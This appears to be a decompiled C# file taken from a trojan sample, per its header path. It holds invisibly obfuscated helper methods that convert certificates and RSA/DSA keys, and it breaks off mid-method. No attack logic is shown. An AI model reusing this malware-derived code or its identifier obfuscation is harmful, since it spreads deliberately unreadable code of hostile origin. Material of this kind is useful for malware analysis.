// Decompiled with JetBrains decompiler
// Type: ‍⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

public sealed class \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮
{
  private \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮()
  {
  }

  public static X509Certificate \u206D⁪‮‫‮‍⁫⁯⁯‫⁬⁯‮⁫​‪‌‌⁯‍⁯‎‏‏⁬‪‫​⁬‫⁬⁯⁯‪⁭⁪​⁬‌‍‮(
    \u202B‮⁭‏‮⁭‭⁭‌‍‎‎‍‭‌⁮​​⁭‌‮​‭⁬​‏‍⁯⁪⁭‏​⁪‏⁭⁭‪‫⁫⁫‮ _param0)
  {
    return new X509Certificate(_param0.GetDerEncoded());
  }

  public static X509Certificate \u206D⁪‮‫‮‍⁫⁯⁯‫⁬⁯‮⁫​‪‌‌⁯‍⁯‎‏‏⁬‪‫​⁬‫⁬⁯⁯‪⁭⁪​⁬‌‍‮(
    \u206D⁫‍⁯‏‍‌‫‫‮⁯‭‫‌⁪‬​⁫‪⁯‮⁪‎‮‬‮⁭‬⁪‪⁫‏‮⁭‭‭‎‬⁭‌‮ _param0)
  {
    return new X509Certificate(_param0.\u206F​‪‪‌‮‬‫⁮​⁭‎‪​‬⁯‫‎⁭‪‌​‮‮‌​‌‮‏‭‎‫‌‮⁭‍‭‫‬‫‮());
  }

  public static \u206D⁫‍⁯‏‍‌‫‫‮⁯‭‫‌⁪‬​⁫‪⁯‮⁪‎‮‬‮⁭‬⁪‪⁫‏‮⁭‭‭‎‬⁭‌‮ \u202A‏⁮‍⁭‭⁭‮‏‮⁫‫‪⁭‎‫‬​‭⁯⁬‍‌‍⁯⁪⁫‍‫‮‏⁫⁬⁬‪⁭‏⁪⁫⁭‮(
    X509Certificate _param0)
  {
    return new \u200E⁭⁮‮‬‮⁭⁭‮⁭⁯‬‌‌​‭⁮‍‭‏‫‌​‮‎‌‍‎⁬⁮⁯‮‪‎‪‬⁬⁯⁯⁬‮().\u206E‮⁬⁪‏‪⁭⁯⁫‍⁭‌‌‌‭‬‭⁯⁭‏‌⁮⁮⁯‭⁪‏‌⁬‫⁬⁭‌⁫⁫‮⁪‫‍‍‮(_param0.GetRawCertData());
  }

  public static \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮ \u202B⁮⁯⁭⁬‮​⁪‎‮‌‬‮‏⁪‌‏⁮‬‌⁭‎⁬⁪⁪‌​‍‭‏⁫‮​‭⁮⁪‫⁬‭‬‮(
    DSA _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202B⁮⁯⁭⁬‮​⁪‎‮‌‬‮‏⁪‌‏⁮‬‌⁭‎⁬⁪⁪‌​‍‭‏⁫‮​‭⁮⁪‫⁬‭‬‮(_param0.ExportParameters(true));
  }

  public static \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮ \u202B⁮⁯⁭⁬‮​⁪‎‮‌‬‮‏⁪‌‏⁮‬‌⁭‎⁬⁪⁪‌​‍‭‏⁫‮​‭⁮⁪‫⁬‭‬‮(
    DSAParameters _param0)
  {
    \u206F⁭‏⁯‪‎⁫⁬‭⁪‭⁯⁯‭⁮‭‎​⁭⁮⁮⁪‍‍‎‬⁭‍⁪‎‮‭‮‮‎‎⁯⁫‌‪‮ obj1 = _param0.Seed != null ? new \u206F⁭‏⁯‪‎⁫⁬‭⁪‭⁯⁯‭⁮‭‎​⁭⁮⁮⁪‍‍‎‬⁭‍⁪‎‮‭‮‮‎‎⁯⁫‌‪‮(_param0.Seed, _param0.Counter) : (\u206F⁭‏⁯‪‎⁫⁬‭⁪‭⁯⁯‭⁮‭‎​⁭⁮⁮⁪‍‍‎‬⁭‍⁪‎‮‭‮‮‎‎⁯⁫‌‪‮) null;
    \u206B‮‪​‏​⁫‮⁬‫‫⁯⁫⁪⁪⁪⁯‏‎‬⁮​⁭⁭⁯‌⁬⁬‍‫⁮⁯‏‭‎⁮‫⁪‏‍‮ obj2 = new \u206B‮‪​‏​⁫‮⁬‫‫⁯⁫⁪⁪⁪⁯‏‎‬⁮​⁭⁭⁯‌⁬⁬‍‫⁮⁯‏‭‎⁮‫⁪‏‍‮(new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.P), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Q), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.G), obj1);
    return new \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮((\u206D⁬‬⁫‪‎⁭⁭‌​⁬‌⁯‍‍⁯⁭‬‫‪‭‏⁮‏‭‬‫⁮‌‏⁯‫‫⁫⁫‭⁭‏‌‍‮) new \u206E‭‭⁭‍​⁮⁬⁬‏⁬‭‫⁮‫‭‭‎‫‍‎⁭‏‍⁮‏⁯⁭⁫​‭‪​‮‪‎‫‪⁫‬‮(new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Y), obj2), (\u206D⁬‬⁫‪‎⁭⁭‌​⁬‌⁯‍‍⁯⁭‬‫‪‭‏⁮‏‭‬‫⁮‌‏⁯‫‫⁫⁫‭⁭‏‌‍‮) new \u202B‭‪‬‪‫⁯‌⁪⁪‭‎⁯⁭‭‬‪⁬‭​⁭⁬⁭⁮‭⁬‭‍⁯⁬‬‮⁮‌‫‭‌‭⁮⁬‮(new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.X), obj2));
  }

  public static \u206E‭‭⁭‍​⁮⁬⁬‏⁬‭‫⁮‫‭‭‎‫‍‎⁭‏‍⁮‏⁯⁭⁫​‭‪​‮‪‎‫‪⁫‬‮ \u200B‌‏‪‌​‌‭⁭‫‎​​⁭⁫‫⁬‮⁯‎⁯⁭‎‫‮‮‭⁯⁮⁬‭‮‭‌‭‭⁪‭‍‫‮(
    DSA _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200B‌‏‪‌​‌‭⁭‫‎​​⁭⁫‫⁬‮⁯‎⁯⁭‎‫‮‮‭⁯⁮⁬‭‮‭‌‭‭⁪‭‍‫‮(_param0.ExportParameters(false));
  }

  public static \u206E‭‭⁭‍​⁮⁬⁬‏⁬‭‫⁮‫‭‭‎‫‍‎⁭‏‍⁮‏⁯⁭⁫​‭‪​‮‪‎‫‪⁫‬‮ \u200B‌‏‪‌​‌‭⁭‫‎​​⁭⁫‫⁬‮⁯‎⁯⁭‎‫‮‮‭⁯⁮⁬‭‮‭‌‭‭⁪‭‍‫‮(
    DSAParameters _param0)
  {
    \u206F⁭‏⁯‪‎⁫⁬‭⁪‭⁯⁯‭⁮‭‎​⁭⁮⁮⁪‍‍‎‬⁭‍⁪‎‮‭‮‮‎‎⁯⁫‌‪‮ obj1 = _param0.Seed != null ? new \u206F⁭‏⁯‪‎⁫⁬‭⁪‭⁯⁯‭⁮‭‎​⁭⁮⁮⁪‍‍‎‬⁭‍⁪‎‮‭‮‮‎‎⁯⁫‌‪‮(_param0.Seed, _param0.Counter) : (\u206F⁭‏⁯‪‎⁫⁬‭⁪‭⁯⁯‭⁮‭‎​⁭⁮⁮⁪‍‍‎‬⁭‍⁪‎‮‭‮‮‎‎⁯⁫‌‪‮) null;
    \u206B‮‪​‏​⁫‮⁬‫‫⁯⁫⁪⁪⁪⁯‏‎‬⁮​⁭⁭⁯‌⁬⁬‍‫⁮⁯‏‭‎⁮‫⁪‏‍‮ obj2 = new \u206B‮‪​‏​⁫‮⁬‫‫⁯⁫⁪⁪⁪⁯‏‎‬⁮​⁭⁭⁯‌⁬⁬‍‫⁮⁯‏‭‎⁮‫⁪‏‍‮(new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.P), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Q), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.G), obj1);
    return new \u206E‭‭⁭‍​⁮⁬⁬‏⁬‭‫⁮‫‭‭‎‫‍‎⁭‏‍⁮‏⁯⁭⁫​‭‪​‮‪‎‫‪⁫‬‮(new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Y), obj2);
  }

  public static \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮ \u200D‭‭⁭⁭‎‌‫‍‪⁮⁯‏‭‫‎⁬‮⁯​‫‌⁭‍⁪‏‭‎‏‍‪‭‪⁭‏‮‍‭‬‏‮(
    RSA _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200D‭‭⁭⁭‎‌‫‍‪⁮⁯‏‭‫‎⁬‮⁯​‫‌⁭‍⁪‏‭‎‏‍‪‭‪⁭‏‮‍‭‬‏‮(_param0.ExportParameters(true));
  }

  public static \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮ \u200D‭‭⁭⁭‎‌‫‍‪⁮⁯‏‭‫‎⁬‮⁯​‫‌⁭‍⁪‏‭‎‏‍‪‭‪⁭‏‮‍‭‬‏‮(
    RSAParameters _param0)
  {
    \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮ obj1 = new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Modulus);
    \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮ obj2 = new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Exponent);
    return new \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮((\u206D⁬‬⁫‪‎⁭⁭‌​⁬‌⁯‍‍⁯⁭‬‫‪‭‏⁮‏‭‬‫⁮‌‏⁯‫‫⁫⁫‭⁭‏‌‍‮) new \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮(false, obj1, obj2), (\u206D⁬‬⁫‪‎⁭⁭‌​⁬‌⁯‍‍⁯⁭‬‫‪‭‏⁮‏‭‬‫⁮‌‏⁯‫‫⁫⁫‭⁭‏‌‍‮) new \u200D‪‪​⁪⁬‪‌​⁮⁭​⁯‪⁫⁮⁮‫⁬‏​⁮‪‭⁯‭‌‬‮⁭⁯‏⁬‮‬⁫​‎‬‏‮(obj1, obj2, new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.D), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.P), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Q), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.DP), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.DQ), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.InverseQ)));
  }

  public static \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮ \u206E‭⁪‮⁪⁭⁯‎⁬⁬‬‌‪‏‬‌⁭⁬⁫⁫‌‍⁯⁪⁮⁯⁯‌‍‮‏‫‬⁯‭‎‮‫⁮‫‮(
    RSA _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206E‭⁪‮⁪⁭⁯‎⁬⁬‬‌‪‏‬‌⁭⁬⁫⁫‌‍⁯⁪⁮⁯⁯‌‍‮‏‫‬⁯‭‎‮‫⁮‫‮(_param0.ExportParameters(false));
  }

  public static \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮ \u206E‭⁪‮⁪⁭⁯‎⁬⁬‬‌‪‏‬‌⁭⁬⁫⁫‌‍⁯⁪⁮⁯⁯‌‍‮‏‫‬⁯‭‎‮‫⁮‫‮(
    RSAParameters _param0)
  {
    return new \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮(false, new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Modulus), new \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮(1, _param0.Exponent));
  }

  public static \u200F⁬‏⁮‫⁭⁫⁬⁭‏⁮‮‌⁫‍‭‍‍⁫‫‌‍‏‍⁯‏‪⁮⁭‏⁪⁫⁬⁯‍⁮⁭‏⁫⁫‮ \u202A‏‬‫⁭​⁫‌‬⁬⁯‍‪⁭‫​⁭⁫‎⁭‭⁭‬⁭⁯⁭‮‫‭⁬⁬‎⁪​‫‎⁯‏⁮⁬‮(
    AsymmetricAlgorithm _param0)
  {
    switch (_param0)
    {
      case DSA _:
        return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202B⁮⁯⁭⁬‮​⁪‎‮‌‬‮‏⁪‌‏⁮‬‌⁭‎⁬⁪⁪‌​‍‭‏⁫‮​‭⁮⁪‫⁬‭‬‮((DSA) _param0);
      case RSA _:
        return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200D‭‭⁭⁭‎‌‫‍‪⁮⁯‏‭‫‎⁬‮⁯​‫‌⁭‍⁪‏‭‎‏‍‪‭‪⁭‏‮‍‭‬‏‮((RSA) _param0);
      default:
        throw new ArgumentException("Unsupported algorithm specified", "privateKey");
    }
  }

  public static RSA \u200D‪⁪‮⁪‌⁪⁮‭‏​⁪⁮⁫‏⁭​‌‏‭⁬‍‌‮‭​‎​‫‭‏⁫‏‍‌‏‫⁪⁮⁯‮(
    \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮ _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(\u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(_param0));
  }

  public static RSA \u200D‪⁪‮⁪‌⁪⁮‭‏​⁪⁮⁫‏⁭​‌‏‭⁬‍‌‮‭​‎​‫‭‏⁫‏‍‌‏‫⁪⁮⁯‮(
    \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮ _param0,
    CspParameters _param1)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(\u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(_param0), _param1);
  }

  public static RSA \u200D‪⁪‮⁪‌⁪⁮‭‏​⁪⁮⁫‏⁭​‌‏‭⁬‍‌‮‭​‎​‫‭‏⁫‏‍‌‏‫⁪⁮⁯‮(
    \u200D‪‪​⁪⁬‪‌​⁮⁭​⁯‪⁫⁮⁮‫⁬‏​⁮‪‭⁯‭‌‬‮⁭⁯‏⁬‮‬⁫​‎‬‏‮ _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(\u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(_param0));
  }

  public static RSA \u200D‪⁪‮⁪‌⁪⁮‭‏​⁪⁮⁫‏⁭​‌‏‭⁬‍‌‮‭​‎​‫‭‏⁫‏‍‌‏‫⁪⁮⁯‮(
    \u200D‪‪​⁪⁬‪‌​⁮⁭​⁯‪⁫⁮⁮‫⁬‏​⁮‪‭⁯‭‌‬‮⁭⁯‏⁬‮‬⁫​‎‬‏‮ _param0,
    CspParameters _param1)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(\u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(_param0), _param1);
  }

  public static RSA \u200D‪⁪‮⁪‌⁪⁮‭‏​⁪⁮⁫‏⁭​‌‏‭⁬‍‌‮‭​‎​‫‭‏⁫‏‍‌‏‫⁪⁮⁯‮(
    \u202E⁭⁭⁬‎⁫⁮⁮⁮⁮‭‪‭⁮‮‪‌‫⁪⁬‪⁯⁬‫‏‭⁮‮⁮⁮‎⁯‏‫‪​⁬⁯‬⁭‮ _param0)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(\u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(_param0));
  }

  public static RSA \u200D‪⁪‮⁪‌⁪⁮‭‏​⁪⁮⁫‏⁭​‌‏‭⁬‍‌‮‭​‎​‫‭‏⁫‏‍‌‏‫⁪⁮⁯‮(
    \u202E⁭⁭⁬‎⁫⁮⁮⁮⁮‭‪‭⁮‮‪‌‫⁪⁬‪⁯⁬‫‏‭⁮‮⁮⁮‎⁯‏‫‪​⁬⁯‬⁭‮ _param0,
    CspParameters _param1)
  {
    return \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(\u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(_param0), _param1);
  }

  public static RSAParameters \u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(
    \u202A⁫‎⁯‎⁪‫‬​⁪⁫‭⁪‎‬‪‎⁬⁭⁪​⁬⁪⁪‫‪⁯‏⁪⁬⁫‪​‬‮‫⁬‌⁬‎‮ _param0)
  {
    RSAParameters rsaParameters = new RSAParameters();
    rsaParameters.Modulus = _param0.\u200D‌⁯‍‭‪‍⁭⁪​‭‮⁬‌⁯⁮⁮‏⁬⁯‪‪‏⁪‏⁬‍​‌‎⁮‬⁬‍‭‎‫‪‮‏‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮();
    if (_param0.\u206D⁪⁯‏‪‏‍‏⁭‪⁮‏⁬⁭‪⁬⁬⁬⁪​‍‪‮‏‮⁮‍⁪‪⁪⁪‮⁮‏‮⁪‪‬⁭‍‮)
      rsaParameters.D = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u206A​⁮‎​‮‪⁫⁬‏​⁭‍​‏‬​⁫⁯​⁫‍⁫‬‪‎‌‮‬​‏‬‎⁮‬⁬‮⁬⁫⁯‮, rsaParameters.Modulus.Length);
    else
      rsaParameters.Exponent = _param0.\u206A​⁮‎​‮‪⁫⁬‏​⁭‍​‏‬​⁫⁯​⁫‍⁫‬‪‎‌‮‬​‏‬‎⁮‬⁬‮⁬⁫⁯‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮();
    return rsaParameters;
  }

  public static RSAParameters \u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(
    \u200D‪‪​⁪⁬‪‌​⁮⁭​⁯‪⁫⁮⁮‫⁬‏​⁮‪‭⁯‭‌‬‮⁭⁯‏⁬‮‬⁫​‎‬‏‮ _param0)
  {
    RSAParameters rsaParameters = new RSAParameters()
    {
      Modulus = _param0.\u200D‌⁯‍‭‪‍⁭⁪​‭‮⁬‌⁯⁮⁮‏⁬⁯‪‪‏⁪‏⁬‍​‌‎⁮‬⁬‍‭‎‫‪‮‏‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮(),
      Exponent = _param0.\u200C‮‫⁯‮‏‮‍⁫⁯‭‍‍‬​‏​‍‌‮​‌⁫‪​​​⁫‏​⁮‭‮‪‏‎‮⁬‌⁮‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮(),
